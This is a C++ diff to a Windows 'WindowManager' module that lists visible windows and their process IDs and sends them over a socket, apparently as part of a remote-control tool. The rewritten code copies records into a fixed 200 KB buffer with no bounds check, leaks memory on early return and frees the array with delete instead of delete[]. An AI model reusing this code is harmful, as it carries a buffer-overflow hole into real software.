@@ -1,47 +1,43 @@
 #include "WindowManager.h"
 #include "Command.h"
 
-
+int bufferSize = 0;
+int windowCount = 0;
 bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
-	DWORD	dwLength = 0;
-	DWORD	dwOffset = 0;
-	DWORD	dwProcessID = 0;
-	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
 
 	char	strTitle[1024];
 	memset(strTitle, 0, sizeof(strTitle));
 	GetWindowText(hwnd, strTitle, sizeof(strTitle));
 
-	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
-		return true;
+	char *lpBuffer = (char *)lParam;
+	LPWindowInfo lpWindowInfo = new WindowInfo;
+	memset(lpWindowInfo->strTitle, 0, sizeof(lpWindowInfo->strTitle));
+	GetWindowText(hwnd, lpWindowInfo->strTitle , 512);
+	if (!IsWindowVisible(hwnd) || strlen(lpWindowInfo->strTitle) == 0)
+	return true;
+	GetWindowThreadProcessId(hwnd, &lpWindowInfo->dwProcessID);
 
-
-	if (lpBuffer == NULL)
-		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
-
-	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
-	dwOffset = LocalSize(lpBuffer);
-
-	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
-
-	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
-	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
-	*(LPBYTE *)lParam = lpBuffer;
+	memcpy(lpBuffer + bufferSize, lpWindowInfo, sizeof(WindowInfo));
+	bufferSize += sizeof(WindowInfo);
+	windowCount++;
+    delete lpWindowInfo;
+	//(char *)lParam = lpBuffer + strlen(lpBuffer);
 	return true;
 }
 
 
 void getWindowList(SOCKET windowManagerSocket, LPMsgHead lpMsgHead){
-	UINT	nRet = -1;
-	LPBYTE	lpBuffer = NULL;
-	
-	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
-	lpBuffer[0] = 1;
+	bufferSize = 0;
+	windowCount = 0;
+	char *lpBuffer = new char [1024 * 200]; 
+	memset(lpBuffer, 0, 1024*200);
+	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)lpBuffer);
 	lpMsgHead->dwCmd =  8888;
-	lpMsgHead->dwSize = LocalSize(lpBuffer);// strlen((char*)lpBuffer);
-	SendMsg(windowManagerSocket, (char*)lpBuffer, lpMsgHead);
-	LocalFree(lpBuffer);
+	lpMsgHead->dwSize = bufferSize;
+	lpMsgHead->dwExtend1 = windowCount;
+	SendMsg(windowManagerSocket, lpBuffer, lpMsgHead);
+	delete lpBuffer;
 }
 
 
